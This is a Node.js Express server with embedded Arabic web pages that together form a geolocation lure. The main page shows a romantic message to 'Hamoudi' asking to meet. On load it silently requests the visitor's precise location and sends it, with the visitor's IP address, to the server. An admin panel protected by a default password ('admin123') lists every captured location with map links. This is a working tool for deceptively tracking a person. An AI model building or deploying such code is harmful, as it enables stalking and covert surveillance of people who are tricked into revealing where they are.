// server.js
require('dotenv').config();
const express = require('express');
const { Location, connectDB } = require('./database');

const app = express();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

app.use(express.json());

// --- دالة الترميز العكسي (نفسها) ---
async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`;
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'MyGeolocationApp/1.0 (educational)',
        'Accept-Language': 'ar'
      }
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    return data.display_name || null;
  } catch (error) {
    console.error('Reverse geocoding failed:', error.message);
    return null;
  }
}

// --- API حفظ الموقع ---
app.post('/api/location', async (req, res) => {
  const { latitude, longitude, accuracy } = req.body;

  if (typeof latitude !== 'number' || typeof longitude !== 'number') {
    return res.status(400).json({ error: 'latitude و longitude يجب أن يكونا أرقاماً' });
  }
  if (latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
    return res.status(400).json({ error: 'إحداثيات خارج النطاق المسموح' });
  }

  const locationName = await reverseGeocode(latitude, longitude);
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip;

  try {
    const newLocation = new Location({
      latitude,
      longitude,
      accuracy: accuracy || null,
      location_name: locationName,
      ip_address: ip
    });
    await newLocation.save();
    res.status(201).json({
      message: 'تم حفظ الموقع بنجاح',
      id: newLocation._id,
      locationName: locationName
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'خطأ في الخادم أثناء الحفظ' });
  }
});

// --- API عرض المواقع (لوحة الإدارة) ---
app.get('/api/locations', async (req, res) => {
  if (req.query.password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'غير مصرح' });
  }
  try {
    const locations = await Location.find().sort({ timestamp: -1 }).lean();
    res.json(locations);
  } catch (error) {
    res.status(500).json({ error: 'خطأ في جلب البيانات' });
  }
});

// --- الصفحة الرئيسية (index.html مضمّنة) ---
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>أنا بحبك يا حمودي</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      color: white;
      text-align: center;
      direction: rtl;
    }
    .card {
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px 30px;
      max-width: 450px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
    }
    #status {
      margin-top: 20px;
      font-size: 0.95rem;
      min-height: 24px;
      line-height: 1.6;
    }
    .btn-retry {
      background: white;
      color: #e91e63;
      border: none;
      padding: 10px 25px;
      border-radius: 30px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
      transition: transform 0.2s;
      display: none;
    }
    .btn-retry:hover { transform: scale(1.05); }
  </style>
</head>
<body>
  <div class="card">
    <h1>🤍 أنا بحبك يا حمودي 🤍</h1>
    <p>ممكن نتقابل؟ عايزين نتعرف</p>
    <div id="status">⏳ جاري طلب الموقع تلقائياً...</div>
    <button id="retryBtn" class="btn-retry">🔄 حاول مرة أخرى</button>
  </div>
  <script>
    const statusDiv = document.getElementById('status');
    const retryBtn = document.getElementById('retryBtn');

    function sendLocation(latitude, longitude, accuracy) {
      statusDiv.textContent = 'جاري إرسال الموقع...';
      fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ latitude, longitude, accuracy })
      })
      .then(r => r.ok ? r.json() : r.json().then(e => { throw new Error(e.error || 'فشل الحفظ'); }))
      .then(data => {
        const city = data.locationName ? ' (' + data.locationName + ')' : '';
        statusDiv.textContent = '🎉 تم إرسال موقعك بنجاح' + city + '! شكراً لك.';
      })
      .catch(err => {
        statusDiv.textContent = '❌ خطأ أثناء الإرسال: ' + err.message;
        retryBtn.style.display = 'inline-block';
      });
    }

    function requestLocation() {
      if (!navigator.geolocation) {
        statusDiv.textContent = 'المتصفح لا يدعم تحديد الموقع.';
        return;
      }
      statusDiv.textContent = '⏳ جاري طلب الموقع تلقائياً...';
      retryBtn.style.display = 'none';
      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          statusDiv.textContent = '✅ تم تحديد الموقع.';
          sendLocation(latitude, longitude, accuracy);
        },
        err => {
          let msg = 'حدث خطأ غير معروف.';
          if (err.code === err.PERMISSION_DENIED) msg = '⚠️ تم رفض إذن الوصول إلى الموقع. إذا غيرت رأيك، اضغط حاول مرة أخرى.';
          else if (err.code === err.POSITION_UNAVAILABLE) msg = '⚠️ معلومات الموقع غير متاحة حالياً.';
          else if (err.code === err.TIMEOUT) msg = '⚠️ انتهت مهلة طلب الموقع.';
          statusDiv.textContent = msg;
          retryBtn.style.display = 'inline-block';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
    window.addEventListener('load', requestLocation);
    retryBtn.addEventListener('click', requestLocation);
  </script>
</body>
</html>`);
});

// --- لوحة الإدارة (admin.html مضمّنة) ---
app.get('/admin', (req, res) => {
  if (req.query.password !== ADMIN_PASSWORD) {
    return res.status(401).send('غير مصرح. أضف ?password=كلمة_المرور');
  }
  res.send(`<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>لوحة الإدارة – المواقع المسجلة</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; margin: 20px; direction: rtl; }
    table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; }
    th, td { padding: 12px 15px; border-bottom: 1px solid #ddd; text-align: center; }
    th { background: #e91e63; color: white; }
    .error { color: red; }
    .location-link { color: #e91e63; text-decoration: none; }
    .location-link:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <h1>📍 المواقع المسجلة</h1>
  <div id="content"></div>
  <script>
    const params = new URLSearchParams(window.location.search);
    const password = params.get('password');
    if (!password) {
      document.getElementById('content').innerHTML = '<p class="error">الرجاء إضافة ?password=كلمة_المرور إلى الرابط.</p>';
    } else {
      fetch('/api/locations?password=' + encodeURIComponent(password))
        .then(r => { if (!r.ok) throw new Error('غير مصرح'); return r.json(); })
        .then(data => {
          if (!data.length) {
            document.getElementById('content').innerHTML = '<p>لا توجد مواقع بعد.</p>';
            return;
          }
          let html = '<table><thead><tr><th>#</th><th>خط العرض</th><th>خط الطول</th><th>الدقة</th><th>المكان</th><th>الوقت</th><th>IP</th><th>الخريطة</th></tr></thead><tbody>';
          data.forEach(e => {
            html += '<tr><td>' + e._id + '</td><td>' + e.latitude + '</td><td>' + e.longitude + '</td><td>' + (e.accuracy ? e.accuracy.toFixed(1)+' م' : 'غير معروف') + '</td><td>' + (e.location_name || 'غير معروف') + '</td><td>' + e.timestamp + '</td><td>' + (e.ip_address || 'غير متوفر') + '</td><td><a class="location-link" href="https://www.google.com/maps?q=' + e.latitude + ',' + e.longitude + '" target="_blank">عرض</a></td></tr>';
          });
          html += '</tbody></table>';
          document.getElementById('content').innerHTML = html;
        })
        .catch(err => {
          document.getElementById('content').innerHTML = '<p class="error">خطأ: ' + err.message + '</p>';
        });
    }
  </script>
</body>
</html>`);
});

// للاستخدام المحلي فقط
if (process.env.NODE_ENV !== 'production') {
  connectDB().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log('محلي: http://localhost:3000'));
  });
}

module.exports = app;